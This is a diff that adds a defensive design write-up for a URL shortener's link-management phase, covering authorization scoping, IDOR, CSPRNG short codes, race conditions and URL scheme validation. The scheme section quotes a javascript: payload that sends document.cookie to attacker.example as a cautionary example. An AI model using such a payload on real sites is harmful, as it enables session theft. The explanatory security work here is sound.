@@ -4605,3 +4605,990 @@ library's own tests. If that residual risk mattered more, the fix
 wouldn't be hand-rolling JWKS verification to make it "testable" —
 it'd be a slower, separate CI tier of integration tests against Google's
 real endpoint with a disposable test OAuth client.
+
+---
+
+## Phase 6: Link Management
+
+### New dependency: nanoid
+
+**What it is.** `nanoid` is a tiny, dependency-free ID generator. Its
+default export produces a URL-safe random string from a CSPRNG;
+`customAlphabet(alphabet, length)` — the part actually used here — builds
+a generator constrained to a specific character set and length instead of
+nanoid's own default alphabet/size.
+
+**Why it exists in this project.** A link needs a short, unpredictable
+identifier: short so `clickscope.io/<code>` is actually shorter than the
+original URL, unpredictable so an attacker can't guess or enumerate
+other users' short codes and land on private destinations. Neither
+requirement is satisfied by what's already in the codebase —
+`crypto.randomUUID()` (zero new dependency) produces a 36-character
+string, far too long for a "short" link; hand-rolling a generator on top
+of `Math.random()` would be short but not unpredictable (see the CSPRNG
+section below for why that matters concretely). `nanoid` is the smallest
+addition that's both short and cryptographically unpredictable.
+
+**How it works mechanically.** `src/lib/shortCode.ts` calls
+`customAlphabet(ALPHABET, DEFAULT_SHORT_CODE_LENGTH)` once at module load
+to build a reusable generator function, then `generateShortCode()` just
+invokes it. Under the hood, `customAlphabet` pulls raw bytes from
+Node's `crypto.randomBytes` (a CSPRNG, see below) and maps them onto the
+given alphabet via rejection sampling, so every character of the output
+is uniformly distributed across the 62-character set — no character is
+subtly more likely than another the way a naive `bytes % 62` mapping
+would produce.
+
+**Where it lives in the codebase.** `src/lib/shortCode.ts`
+(`generateShortCode`, `ALPHABET`, `DEFAULT_SHORT_CODE_LENGTH`); the
+`nanoid` entry in `package.json` `dependencies`.
+
+**Common pitfalls.**
+
+- Reaching for `Math.random()` because it's already there and "it's just
+  an ID, not a password" — the whole point of Phase 4's CSPRNG-vs-`Math.random()`
+  reasoning for tokens applies just as much to an identifier that gates
+  access to a resource.
+- Using nanoid's *default* alphabet (which includes `-` and `_`) instead
+  of `customAlphabet` with an explicit set — this project's alphabet is a
+  deliberate, separate decision from "whatever nanoid ships with", see
+  the alias-charset discussion below.
+
+**Production considerations.** None beyond what's already true of any
+small, actively-maintained dependency: pin a specific major version
+(`^5.1.16`, not the just-released `6.x`) rather than being an early
+adopter of a security-relevant package's major bump, and keep an eye on
+its changelog for CSPRNG-relevant fixes.
+
+**Interview answer.** I added `nanoid` for short-code generation because
+it wraps Node's CSPRNG (`crypto.randomBytes`) instead of `Math.random()`,
+which matters for an identifier that gates access to a link's
+destination — a predictable generator would let an attacker guess or
+enumerate other users' codes. I considered `crypto.randomUUID()` (already
+available, no new dependency) but a UUID's 36 characters defeats the
+point of a "short" link, and a hand-rolled `Math.random()` generator
+would be short but not unpredictable.
+
+---
+
+### Authentication vs. authorization
+
+**What it is.** Authentication answers "who is making this request?" —
+in this app, verifying a JWT and extracting the `sub` claim as
+`req.userId`. Authorization answers a different question: "is this
+specific, authenticated identity allowed to do this specific thing to
+this specific resource?" The two are independent axes — a request can be
+perfectly authenticated (a valid, unexpired token for a real user) and
+still not authorized (that user doesn't own the link they're asking to
+delete).
+
+**Why it exists in this project.** Every route through Phase 5 only
+needed authentication: `GET /api/auth/me` returns *the caller's own*
+data by construction (it reads `req.userId`, there's no other id
+involved). Link routes are the first place a request names a resource
+that might belong to someone else — `GET /api/links/:id` takes an `id`
+from the URL that has no necessary relationship to `req.userId` at all.
+Proving the token is valid says nothing about whether *this* token's
+owner is allowed to see *that* particular row.
+
+**How it works mechanically.** `requireAuth` (unchanged from Phase 4)
+handles authentication only — it populates `req.userId` and nothing
+else; it has no idea what resource the request is about. Authorization
+is a second, separate step that happens inside `linkService`'s query
+layer, on every single function: `getLink`, `updateLink`, and
+`deleteLink` all take `(userId, linkId)` and fold both into one SQL
+`WHERE` clause (see the next section for exactly how). Authentication
+answers "whose request is this", authorization is enforced by literally
+constraining what data that identity's queries can touch.
+
+**Where it lives in the codebase.** Authentication:
+`src/middleware/auth.ts` (`requireAuth`). Authorization:
+`src/services/linkService.ts` — every exported function that takes a
+`linkId` also takes and uses a `userId`.
+
+**Common pitfalls.**
+
+- Treating "the route is behind `requireAuth`" as sufficient security for
+  a per-resource action — `requireAuth` proves identity, not permission;
+  every route in `src/routes/links.ts` needs both.
+- Checking authorization in the route/controller layer with an
+  `if (link.userId !== req.userId)` after an unscoped fetch — technically
+  achieves the same *result* as this phase's approach in the common case,
+  but is structurally weaker; see the next section for why.
+
+**Production considerations.** At larger scale this often grows into a
+dedicated authorization layer (policy objects, an ACL table, a rules
+engine) once resources have more than one owner-and-owner-only shape —
+e.g. shared/team links, read-only collaborators. Nothing in this phase
+needs that yet: single-owner resources with a `user_id` foreign key are
+the simplest case, and the SQL-scoping pattern below is proportionate to
+that simplicity.
+
+**Interview answer.** Authentication proves who's asking; authorization
+decides what they're allowed to touch. `requireAuth` handles the first
+and stops there — it just puts a user id on the request. The second is a
+separate concern this phase introduces for the first time in this
+codebase, because it's the first phase where an authenticated request can
+name a resource — a link id — that doesn't inherently belong to the
+caller. I enforce it in the query layer itself rather than as a
+post-fetch check, which the next section covers in detail.
+
+---
+
+### Object-level authorization enforced in SQL vs. a post-fetch `if`
+
+**What it is.** Two ways to implement "only let a user act on their own
+resource." Approach A: fetch the resource by its id alone, then compare
+`resource.userId === req.userId` in application code, and reject if not.
+Approach B: bake the ownership condition directly into the query that
+fetches (or updates, or deletes) the resource — `WHERE id = $1 AND
+user_id = $2` — so a row belonging to someone else is never returned to
+the application layer in the first place.
+
+**Why it exists in this project.** `linkService.ts` uses approach B
+everywhere. The reason isn't stylistic — it's that approach A has a
+structural weakness approach B doesn't: it depends on every single call
+site remembering to write, and correctly write, the `if` check. Add a
+new route, a new internal helper, a future admin endpoint reusing
+`getLink` — any one of those can forget the check, or get the comparison
+backwards (`!==` vs `===` is a classic typo), and the bug is silent:
+requests just start succeeding for the wrong user. Approach B makes that
+category of mistake structurally impossible, because there is no code
+path where an unscoped row ever exists in memory to leak.
+
+**How it works mechanically.** Every function in `src/services/linkService.ts`
+that touches an existing row takes `(userId, linkId)` and puts both into
+one WHERE clause:
+
+```ts
+export async function getLink(userId: string, linkId: string): Promise<Link | null> {
+  const result = await query<LinkRow>(
+    `SELECT ${LINK_COLUMNS} FROM links WHERE id = $1 AND user_id = $2`,
+    [linkId, userId],
+  );
+  const row = result.rows[0];
+  return row ? toLink(row) : null;
+}
+```
+
+`updateLink` and `deleteLink` do the same — the `WHERE` clause on the
+`UPDATE`/`DELETE` statement itself is the check, not a separate `SELECT`
+followed by a comparison. Postgres either finds a matching row (this
+user, this link) or it doesn't; there is no third state where a row
+exists but the query "found" it and then application code has to decide
+whether to hand it back.
+
+**Where it lives in the codebase.** `src/services/linkService.ts` —
+`getLink`, `updateLink`, `deleteLink`, and `listLinks` (which scopes by
+`user_id` alone, no specific `linkId`) all follow this pattern.
+
+**Common pitfalls.**
+
+- The single most common real-world version of this bug: `SELECT * FROM
+  links WHERE id = $1`, then `if (link.user_id !== req.userId) throw
+  forbidden()` — works fine until someone adds a second call site to the
+  unscoped fetch and forgets the check, or a refactor moves the check
+  above the fetch instead of after it.
+- Believing input validation (checking `id` is a well-formed UUID) has
+  anything to do with authorization — a syntactically valid UUID that
+  belongs to another user is a perfectly valid *request*, just not an
+  authorized one. Validation and authorization are separate concerns
+  addressed by separate mechanisms in this codebase (Zod for the former,
+  the SQL WHERE clause for the latter).
+
+**Production considerations.** This exact pattern is the right level of
+solution for single-owner, foreign-key-scoped resources. It stops
+generalizing once a resource can have multiple legitimate viewers with
+different permission levels (owner can delete, collaborator can only
+read) — that needs an explicit permissions table or policy layer, not
+more WHERE clauses. Postgres Row-Level Security (`CREATE POLICY`) is
+another production option for enforcing this at the database layer
+itself, so even a buggy or compromised application-layer query can't
+bypass it — worth knowing about, not adopted here since a single
+`WHERE user_id = $2` clause per query already gives the same guarantee
+at this scale without RLS's operational complexity (every connection
+needs the right session variable set correctly, migrations get trickier).
+
+**Interview answer.** I fold the ownership check into the query itself —
+`WHERE id = $1 AND user_id = $2` — rather than fetching by id alone and
+comparing in application code afterward. The difference matters because
+the post-fetch `if` check depends on every call site remembering to
+write it correctly; forget it once, in one new route or helper function,
+and that's a silent authorization bypass. Scoping it in the query makes
+that class of bug impossible to introduce by omission — there's no code
+path where an unscoped row is ever in memory to accidentally return.
+
+---
+
+### Broken access control as an OWASP vulnerability class
+
+**What it is.** "Broken Access Control" is OWASP's top-ranked web
+application risk category (A01:2021 in the OWASP Top 10) — access
+control failures where an authenticated user can act on data or
+functionality they shouldn't be able to reach. The specific shape
+relevant here is **IDOR** (Insecure Direct Object Reference): an
+endpoint takes an identifier — a URL id, a query param — directly from
+the client and uses it to fetch a resource without verifying the caller
+actually owns or has permission to access that specific object.
+
+**Why it exists in this project.** `GET /api/links/:id` is a textbook
+IDOR shape: it takes `id` straight from the URL. Without the SQL-scoping
+from the previous section, any authenticated user could enumerate UUIDs
+(or, more realistically, obtain one link id legitimately and then try
+adjacent/predictable ones, or simply try ids seen in another user's
+shared link) and read, edit, or delete a link that isn't theirs — while
+still passing `requireAuth` with a perfectly valid token. This is
+exactly the gap authentication alone cannot close.
+
+**How it works mechanically.** IDOR isn't a single bug pattern to grep
+for — it's a category defined by what's *missing*: an authorization
+check between "the request named a resource" and "the resource was
+acted on." In this codebase specifically, it would look like a route or
+service function that took an `id` and ran a query against it without
+also constraining by `user_id` — the exact thing every function in
+`linkService.ts` avoids.
+
+**Where it lives in the codebase.** Not any one file — it's a property
+of every function in `src/services/linkService.ts` that touches an
+existing row, all consistently scoped as covered above, plus the
+corresponding object-level-authorization tests in
+`tests/routes/links.test.ts` and `tests/services/linkService.test.ts`
+that actively try to demonstrate the vulnerability's absence rather than
+just its features' happy paths.
+
+**Common pitfalls.**
+
+- Assuming a resource's UUID being "unguessable" is itself an
+  authorization control — it isn't. A UUID is an identifier, not a
+  secret; anyone who legitimately sees a link id once (a leaked URL, a
+  browser history entry, a referrer header) has it forever, and IDOR
+  protection has to hold even when the attacker already has a real id in
+  hand, not just against blind enumeration.
+- Testing only the happy path (owner can CRUD their own link) and never
+  writing the negative case (a second user *cannot*) — a route can look
+  completely correct and still be an IDOR if nobody ever tried to break
+  it from the outside. This is exactly why this phase's test suite makes
+  the cross-user attempt-and-verify-unchanged pattern mandatory for every
+  endpoint, not optional.
+
+**Production considerations.** IDOR is consistently one of the most
+common vulnerability classes found in real-world bug bounty reports,
+precisely because it's easy to introduce (one missing WHERE clause) and
+easy to miss in review (the code "looks" like ordinary CRUD). The
+mitigation that scales is the one used here: make the authorized path
+the *only* path a query can take, rather than relying on every reviewer
+to notice a missing check in every new endpoint forever.
+
+**Interview answer.** Broken access control — specifically IDOR, insecure
+direct object reference — is OWASP's #1 web risk category, and it's
+exactly the shape of bug `GET /api/links/:id` is vulnerable to if the
+`user_id` scoping isn't in the query: an authenticated user supplying
+someone else's link id and getting their data back. It's dangerous
+because it's invisible in the happy path — the endpoint looks completely
+correct until someone deliberately tries a second user's resource id,
+which is why I treat "attacker attempts every CRUD operation on another
+user's resource and it 404s, with the row provably unchanged" as a
+required test for every resource endpoint, not an edge case.
+
+---
+
+### 403 vs. 404 for another user's resource
+
+**What it is.** When user B requests a link that exists but belongs to
+user A, the server has (at least) two honest-sounding response options:
+403 Forbidden ("this exists, but you can't have it") or 404 Not Found
+("nothing here"). This project returns 404.
+
+**Why it exists in this project.** A 403 response, on its own,
+*confirms* that the id refers to a real resource — it tells the caller
+"you found something, you're just not allowed to see it." For a resource
+whose id space an attacker could iterate or guess pieces of, that's an
+information leak: a 403/404 split lets someone map out which ids
+correspond to real links without ever seeing their contents, the same
+enumeration risk Phase 4's identical-message decision for login
+(`INVALID_CREDENTIALS_MESSAGE`, "no such user" vs "wrong password") was
+built to prevent. Returning identical 404s for "doesn't exist" and
+"exists but isn't yours" makes both cases genuinely indistinguishable
+from the outside.
+
+**How it works mechanically.** `getLink`, `updateLink`, and `deleteLink`
+all return `null`/`false` — never throw — for both "no matching row"
+and "row exists, wrong `user_id`", because the single WHERE clause
+covering both id and ownership can't itself tell those two cases apart
+(and by design, doesn't try to). The route layer then throws one
+`notFound('Link not found')` for that single falsy outcome:
+
+```ts
+const link = await getLink(req.userId!, id);
+if (!link) {
+  throw notFound('Link not found');
+}
+```
+
+There's no `forbidden()` call anywhere in `src/routes/links.ts` — the
+service layer's inability to distinguish the two cases makes it
+impossible for the route to leak the distinction even by accident.
+
+**Where it lives in the codebase.** `src/services/linkService.ts`
+(`null`/`false` returns, no distinction made) and `src/routes/links.ts`
+(uniform `notFound()` on every falsy service result, for `GET`, `PATCH`,
+and `DELETE /:id`).
+
+**Common pitfalls.**
+
+- Implementing the ownership check as a separate step *after* an
+  existence check — `if (!link) throw notFound(); if (link.userId !==
+  req.userId) throw forbidden();` — which reintroduces exactly the
+  distinguishable-response problem this design avoids, even if each
+  individual check looks reasonable in isolation.
+- Assuming 404-for-both is free — it does cost something, covered next.
+
+**Production considerations.** This is a real, acknowledged tradeoff, not
+a free lunch: a legitimate caller who mistypes an id and one whose id is
+correct but unauthorized get the identical, less-specific error message,
+which makes debugging a legitimate integration slightly harder ("is my
+id wrong, or do I not have access?"). That cost is accepted here because
+the alternative — a clearer error for legitimate callers — hands the
+same clarity to an attacker probing the id space. Systems with a strong
+audit-logging story sometimes split the difference: return 404 to the
+client in both cases, but log the *actual* reason (not found vs.
+forbidden) server-side, so operators retain the diagnostic signal
+without exposing it externally.
+
+**Interview answer.** I return 404, not 403, when a link exists but
+belongs to another user — the same information-hiding logic as Phase 4's
+identical login-error message. A 403 confirms the id is real, which lets
+an attacker map out which ids correspond to actual resources without
+ever seeing their contents. The service layer structurally can't leak
+this distinction because `getLink`/`updateLink`/`deleteLink` return the
+same falsy value for "doesn't exist" and "exists but isn't yours" — the
+route always throws one generic 404 for both. The real cost is debugging
+friction for a legitimate caller who genuinely mistyped an id, which I
+accept as the right tradeoff for a resource with a guessable-format id
+space.
+
+---
+
+### CSPRNG vs. `Math.random()` for identifiers
+
+**What it is.** A cryptographically secure pseudo-random number generator
+(CSPRNG) produces output that's computationally infeasible to predict
+even if an attacker has seen previous outputs and knows the algorithm.
+`Math.random()`, in V8, is backed by xorshift128+ — fast and
+statistically well-distributed, but *not* designed to resist prediction;
+its internal state has been reconstructed from as few as a handful of
+observed outputs in published research.
+
+**Why it exists in this project.** A link's short code is, functionally,
+a bearer credential — whoever has the code (or, once Phase 7 exists,
+whoever hits the right URL) reaches the destination behind it. If short
+codes were generated with a predictable algorithm, an attacker who
+observed a few real codes could potentially predict others without ever
+being handed them, the same way a predictable session-token generator
+would undermine everything Phase 4 did correctly with JWTs. `nanoid`'s
+use of `crypto.randomBytes` closes that gap the same way bcrypt's random
+salt and the JWT's HMAC signature do elsewhere in this codebase.
+
+**How it works mechanically.** `crypto.randomBytes` (which `nanoid`
+calls internally) sources entropy from the operating system's CSPRNG —
+on Linux, ultimately `getrandom(2)`, backed by the kernel's entropy pool.
+That's a fundamentally different trust model from `Math.random()`, whose
+internal state is just 128 bits set once at engine startup and then
+deterministically transformed — no external entropy involved after that.
+
+**Where it lives in the codebase.** `src/lib/shortCode.ts` —
+`generateShortCode()` is the only place this project generates an
+identifier that gates access to something, making it the one place this
+distinction is load-bearing (JWT signing already uses `jsonwebtoken`'s
+own CSPRNG-backed randomness internally, from Phase 4).
+
+**Common pitfalls.**
+
+- Using `Math.random()` for "just" a short code because it's not a
+  password — the threat model is the same shape as a password: an
+  attacker able to predict outputs can access something they shouldn't,
+  regardless of what the value is called.
+- Assuming length alone solves this — a long, predictable identifier is
+  still predictable. Unpredictability comes from the *source* of
+  randomness, not the string's length; length only affects how many
+  outputs an attacker would have to enumerate if they *were* forced to
+  guess blindly, which is a separate concern (see collision probability
+  below).
+
+**Production considerations.** None beyond what's already standard here:
+CSPRNGs occasionally block briefly on systems with genuinely low
+entropy (rare on a server with modern kernels, more of a concern on
+constrained embedded devices this project will never run on) — not a
+practical concern at this scale.
+
+**Interview answer.** `Math.random()` isn't cryptographically secure —
+its internal PRNG state can, in principle, be reconstructed from
+observed outputs, which matters for anything whose unpredictability is
+actually load-bearing for security. A link's short code qualifies: it's
+effectively a bearer credential for whatever it points to. `nanoid` uses
+`crypto.randomBytes`, which is backed by the OS's CSPRNG, closing that
+gap the same way this project already relies on CSPRNG-backed randomness
+for JWT signing and bcrypt salts.
+
+---
+
+### Collision probability and why the DB constraint is the real guarantee
+
+**What it is.** With a 62-character alphabet (`0-9A-Za-z`) and a 7-character
+code, there are 62⁷ ≈ 3.5 trillion possible short codes. The "birthday
+paradox" approximation for collision probability after generating `n`
+random codes from a space of size `N` is roughly `n² / (2N)`. At an
+optimistic-but-plausible 1 million links, that's `(10⁶)² / (2 × 3.5×10¹²)`
+≈ 0.014% — genuinely small, but not zero, and it only grows as the link
+count does.
+
+**Why it exists in this project.** "Vanishingly unlikely" is not the
+same as "impossible," and code that only works when a rare event
+doesn't happen is a latent bug, not a solved problem. `createLink`
+therefore doesn't treat a collision as something that can't occur — it
+handles it as a normal, expected (if rare) outcome via retry.
+
+**How it works mechanically.** Two independent layers work together, and
+it matters that they're not the same thing: the birthday-paradox math
+above says a *specific pair* of generated codes colliding is rare, which
+justifies why a small, fixed retry budget (5 attempts) is enough in
+practice — but the actual *correctness* guarantee that a collision is
+ever caught at all is the database's `UNIQUE` constraint on
+`links.short_code`, enforced unconditionally by Postgres regardless of
+how the application arrived at a duplicate value:
+
+```ts
+for (let attempt = 0; attempt < MAX_GENERATION_ATTEMPTS; attempt += 1) {
+  const row = await insertLink(userId, generateShortCode(), input);
+  if (row) return toLink(row);
+}
+throw internal('Failed to generate a unique short code after multiple attempts');
+```
+
+`insertLink` catches Postgres error `23505` (unique_violation) and
+returns `null` rather than throwing, letting the loop try again with a
+fresh code. Exhausting all 5 attempts — at the probabilities above,
+something that should essentially never happen from randomness alone —
+throws `internal(...)`, a 500: at that point the honest read is "the
+generator or its alphabet regressed," not "bad luck," which is exactly
+what `tests/lib/shortCode.test.ts`'s alphabet/length regression test
+exists to catch before it ever reaches this failure mode in the first
+place.
+
+**Where it lives in the codebase.** The retry loop:
+`src/services/linkService.ts`, `createLink`. The actual guarantee:
+`migrations/20260810111606896_create-links-table.ts`'s `short_code`
+column, declared `unique: true`.
+
+**Common pitfalls.**
+
+- Treating the retry loop itself as the correctness mechanism — it's
+  defense-in-depth for an already-rare event, not what makes duplicate
+  codes impossible. Delete the retry loop and the system is merely less
+  convenient on the rare occasion of a real collision (one client gets a
+  409/500 it has to retry); delete the `UNIQUE` constraint and the system
+  is *broken* — two links could silently share a short code, and
+  whichever route Phase 7 resolves that code to would be ambiguous or
+  simply wrong.
+- Under-provisioning retry attempts relative to actual expected
+  collision rates at a *much* larger scale than this project targets —
+  worth revisiting the math (or the code length) if link volume ever
+  approaches a meaningful fraction of 62⁷.
+
+**Production considerations.** At genuinely large scale (see "what would
+change at 10 million links" below), the fix isn't more retries — it's
+either a longer code (each added character multiplies the space by 62)
+or switching short-code assignment to something collision-free by
+construction, like a base62-encoded auto-incrementing id or a
+Twitter-Snowflake-style scheme, trading the current scheme's
+unpredictability for guaranteed uniqueness and picking up unpredictability
+some other way (e.g. a per-code random suffix) if it's still needed.
+
+**Interview answer.** At 62⁷ possible codes, the birthday-paradox
+collision probability at a million existing links is around 0.01% — low
+enough that a small retry budget handles it comfortably. But the retry
+loop isn't what makes the system correct; the database's `UNIQUE`
+constraint is. The loop catches Postgres's `23505` unique-violation and
+tries a fresh code, up to 5 times, and if it ever exhausts those
+attempts, that's actually stronger evidence of a code regression (a
+shrunk alphabet, a broken generator) than of bad luck — which is exactly
+why there's a dedicated test asserting the generator's actual character
+set and length, not just spot-checking that it returns *a* string.
+
+---
+
+### The check-then-insert TOCTOU race, seen for the third time in this project
+
+**What it is.** TOCTOU (time-of-check to time-of-use) is a race
+condition where a program checks a condition, then acts as if that
+condition still holds — but between the check and the action, another
+process can change the underlying state, invalidating the check. Here:
+"is this alias free?" (check) followed by "insert a row using this
+alias" (use) — two separate operations, with a gap between them where
+another request can slip in.
+
+**Why it exists in this project — again.** This is the third time this
+exact shape has shown up. First, `authService.signup`: a pre-check
+`SELECT` for an existing email, then `INSERT`. Second,
+`authService.findOrCreateOAuthUser`: the same shape, plus a more nuanced
+variant that re-fetches on conflict to distinguish "the same actor raced
+itself" (not an error) from "a genuine competing claim" (a real 409).
+Third, here: `createLink`'s custom-alias path pre-checks `SELECT id FROM
+links WHERE short_code = $1` before inserting. Two concurrent requests
+for the *same* custom alias can both pass that `SELECT` — finding no
+existing row — before either has committed an `INSERT`. Recognizing the
+same pattern for a third time is the point: this isn't a one-off
+gotcha, it's a systemic property of any "check uniqueness, then write"
+sequence that isn't wrapped in additional protection.
+
+**How it works mechanically.** The fix pattern established in Phase 4
+and reused verbatim here: the pre-check `SELECT` stays, purely to give
+the common, non-racing case a fast, friendly 409 without a wasted round
+trip to the database's constraint machinery — but it is explicitly *not*
+what makes the outcome correct. The `INSERT` itself is wrapped in a
+try/catch for Postgres error `23505` (unique_violation), and losing that
+race converts cleanly into the same `conflict()` a sequential duplicate
+would produce:
+
+```ts
+const existing = await query<{ id: string }>('SELECT id FROM links WHERE short_code = $1', [
+  input.customAlias,
+]);
+if (existing.rows[0]) {
+  throw conflict('This alias is already taken');
+}
+
+const row = await insertLink(userId, input.customAlias, input);
+if (!row) {
+  // Lost a race against a concurrent create for the same alias since the pre-check.
+  throw conflict('This alias is already taken');
+}
+```
+
+Notably, the *generated*-code path in the same function has no pre-check
+`SELECT` at all — see the collision-probability section above for why a
+pre-check there would be actively pointless rather than merely
+redundant.
+
+**Where it lives in the codebase.** `src/services/linkService.ts`,
+`createLink`'s custom-alias branch (this phase);
+`src/services/authService.ts`, `signup` and `findOrCreateOAuthUser`
+(Phase 4/5, the first two occurrences).
+
+**Common pitfalls.**
+
+- Treating the pre-check `SELECT` as sufficient on its own, because "the
+  window is really small" — the window's *size* is irrelevant to
+  whether the race is real; under real production concurrency (a
+  double-submitted form, a retried request, a deliberate attacker firing
+  two requests simultaneously) small windows get hit often enough to
+  matter.
+- Forgetting the 23505 catch when writing a *new* uniqueness check in the
+  future, because the pre-check `SELECT` alone "looks" like it already
+  solved the problem in testing (where concurrent requests are rare by
+  accident, not by design).
+
+**Production considerations.** This pattern generalizes to essentially
+any uniqueness constraint enforced partly in application logic: the
+database constraint is always the source of truth, and application-level
+pre-checks are only ever a UX optimization for the common case, never a
+substitute for the constraint. Anywhere this codebase adds a new
+`UNIQUE` column in the future, this two-part pattern (pre-check for a
+nice error message, catch-23505 for correctness) is the template.
+
+**Interview answer.** This is the third time this project hits the same
+check-then-insert race: user signup email, OAuth account linking, and now
+custom short-code aliases. In every case, a `SELECT`-then-`INSERT`
+sequence has a gap where two concurrent requests can both pass the check
+before either commits — the check alone can't be the correctness
+guarantee. The actual guarantee is always the database's own `UNIQUE`
+constraint, with the pre-check `SELECT` kept purely as a fast, friendly
+error path for the non-racing common case. Recognizing it as the same
+recurring pattern, rather than three unrelated bugs, is what makes it
+easy to apply the identical, already-proven fix each time.
+
+---
+
+### Reserved words and route shadowing
+
+**What it is.** "Route shadowing" is what happens when two different
+route patterns could both match the same incoming path, and the one that
+actually wins isn't the one a developer expects — often because a
+literal, specific path segment (like `/api/health`) collides with a
+wildcard or parameterized route (like `/:shortCode`) that would also
+match that exact string.
+
+**Why it exists in this project.** It doesn't apply *yet*, in the
+literal sense — this phase deliberately builds no public redirect route
+at all. But the alias a user picks *today* determines the value stored
+in `short_code` forever (aliases are immutable after creation, by this
+phase's design), and Phase 7 will mount a route shaped like `GET
+/:shortCode` at the application root to resolve any code to its
+destination. If a user were allowed to register the alias `"health"`
+today, that row would sit in the database as a live landmine: the moment
+Phase 7's redirect route exists, a request to `/health` would be
+ambiguous between "the real health-check endpoint" and "someone's
+short link" — and depending on Express's route registration order,
+one of those would silently shadow the other in a way that's very hard
+to debug after the fact, because the bug was actually introduced weeks
+earlier, at alias-creation time.
+
+**How it works mechanically.** `RESERVED_SHORT_CODES` in
+`src/lib/shortCode.ts` is a fixed set of path segments that are real (or
+realistically foreseeable) top-level API routes — `api`, `health`,
+`docs`, `auth`, `login`, `signup`, `admin`, `static`, `assets`,
+`favicon.ico`, `robots.txt`. `customAliasSchema`'s `.refine()` rejects
+any alias matching one of these, case-insensitively, at creation time —
+before a colliding row can ever be written, not after Phase 7 discovers
+the conflict.
+
+**Where it lives in the codebase.** `src/lib/shortCode.ts`
+(`RESERVED_SHORT_CODES`, `isReservedShortCode`, the `.refine()` inside
+`customAliasSchema`).
+
+**Common pitfalls.**
+
+- Deferring this check to whenever the redirect route is actually built
+  (Phase 7) — by then, any reserved-word aliases created in the meantime
+  would already be live, shared, and painful to invalidate retroactively.
+  Enforcing it now, before the routes it protects even exist, avoids
+  ever having to clean up after the fact.
+- Treating the reserved list as exhaustive/permanent — it needs to be
+  kept in sync with the application's actual top-level routes as new
+  ones are added; a reserved-word list that drifts out of date silently
+  stops protecting anything new.
+
+**Production considerations.** A more scalable alternative at a larger
+route surface is deriving the reserved list programmatically from the
+Express router's registered top-level paths at startup, rather than
+maintaining a hand-written array that can drift — not adopted here
+since the current route surface is small enough that a short, explicit
+list is easier to read and reason about than a layer of route
+introspection.
+
+**Interview answer.** Reserved words exist because a custom alias
+written today becomes a permanent path segment that Phase 7's `/:shortCode`
+redirect route will later try to resolve — if someone registered "health"
+as their alias before that route existed, it would silently collide with
+the real health-check endpoint once it did. I reject a fixed list of
+real and foreseeable API path segments at alias-creation time, before
+Phase 7's route (or the conflict) exists at all, rather than waiting to
+discover the collision only once the redirect route is live and someone's
+already using it.
+
+---
+
+### URL scheme validation as an open-redirect / XSS defense
+
+**What it is.** A URL's scheme (the part before `://`, or before `:` for
+schemes like `javascript:`/`data:`) determines fundamentally what
+happens when a browser navigates to it. `http:`/`https:` load a page over
+the network. `javascript:` executes arbitrary script in the current
+page's context. `data:` embeds inline content (including
+`data:text/html,<script>...`) directly, no network fetch at all. `file:`
+attempts to read from the local filesystem.
+
+**Why it exists in this project.** `destinationUrl` is exactly the kind
+of field where scheme matters enormously and is easy to overlook,
+because "is this a valid URL" and "is this a *safe* URL to redirect a
+browser to" are different questions — `new URL('javascript:alert(1)')`
+parses without error; it's a syntactically perfectly valid URL, just an
+extremely dangerous one to redirect to. Once Phase 7's redirect route
+exists, it will `302` a browser straight to whatever's stored in
+`destination_url` — if that value were ever `javascript:document.location='https://attacker.example?cookie='+document.cookie`,
+Click Scope itself would become the delivery mechanism for a
+same-origin-context XSS attack against anyone who clicked the short
+link, using this application's own trusted domain to launder it.
+
+**How it works mechanically.** `destinationUrlSchema` in
+`src/routes/links.ts` runs two checks: Zod's built-in `.url()` for
+general well-formedness, then a `.refine()` that parses the string with
+`new URL(...)` and checks its `.protocol` against an explicit allowlist:
+
+```ts
+const destinationUrlSchema = z
+  .string()
+  .url('destinationUrl must be a valid URL')
+  .refine((url) => ['http:', 'https:'].includes(new URL(url).protocol), {
+    message: 'destinationUrl must use http or https',
+  });
+```
+
+This is an **allowlist**, not a blocklist of known-bad schemes
+(`javascript:`, `data:`, `file:`, ...) — deliberately, because a
+blocklist only ever protects against schemes someone thought to list;
+an allowlist protects against every scheme that isn't `http`/`https`,
+including ones nobody's thought of yet.
+
+**Where it lives in the codebase.** `src/routes/links.ts`
+(`destinationUrlSchema`, shared by both `createLinkSchema` and
+`updateLinkSchema` so the check applies identically on create and on
+every subsequent edit).
+
+**Common pitfalls.**
+
+- Validating scheme only at redirect time (i.e., deferring this to
+  Phase 7) instead of at write time — a link with a malicious scheme
+  would sit in the database as a live payload from the moment it's
+  created until whenever a redirect route happens to re-validate it,
+  which might be never if that route trusts its stored data. Rejecting
+  at write time means no malicious value is ever persisted in the first
+  place.
+- Writing a blocklist of "known bad" schemes instead of an allowlist of
+  "known good" ones — a blocklist requires the defender to have
+  anticipated every dangerous scheme in advance; an allowlist requires
+  only knowing what's actually needed (`http`/`https`), which is a much
+  smaller, more stable list to get right.
+- Assuming `.url()` alone is sufficient because "it's a valid URL" —
+  validity and safety are orthogonal; `javascript:alert(1)` is a
+  perfectly valid URL by the URL spec.
+
+**Production considerations.** Scheme validation closes one class of
+open-redirect/XSS risk but not the entire category — a `destinationUrl`
+of `https://attacker.example/phishing-page` is scheme-valid and
+completely unblocked by this check, because "redirect users to
+attacker-controlled but syntactically fine domains" is a different,
+harder problem (domain reputation/allowlisting, user-facing interstitial
+warnings) that a URL shortener's entire product surface is inherently
+exposed to — out of scope for this phase, worth naming explicitly rather
+than implying scheme validation is a complete solution.
+
+**Interview answer.** I validate `destinationUrl`'s scheme against an
+explicit `http`/`https` allowlist at write time, not just checking
+general URL well-formedness. The risk is concrete: `javascript:` and
+`data:` URLs are syntactically valid, so a naive `.url()` check alone
+lets them through, and once Phase 7's redirect route exists it would
+`302` a browser straight into executing that scheme — turning this
+application's own trusted domain into a same-origin XSS delivery
+mechanism. I used an allowlist rather than a blocklist of known-bad
+schemes specifically because a blocklist only protects against threats
+someone thought to enumerate in advance; an allowlist doesn't need to.
+
+---
+
+### PATCH vs. PUT, and absent-vs-null in partial updates
+
+**What it is.** PUT semantically means "replace this resource entirely
+with what I'm sending" — every field is expected, and an absent field
+means "this resource no longer has that value." PATCH means "apply this
+partial set of changes" — a field absent from the request body means
+"leave it as it is," which is a fundamentally different instruction than
+sending that field with an explicit `null`, which means "clear it."
+`PATCH /api/links/:id` in this codebase needs exactly that
+three-way distinction: unchanged, set-to-a-value, or explicitly-cleared.
+
+**Why it exists in this project.** `expiresAt` and `maxClicks` are
+nullable columns where `null` is a meaningful, intentional value ("this
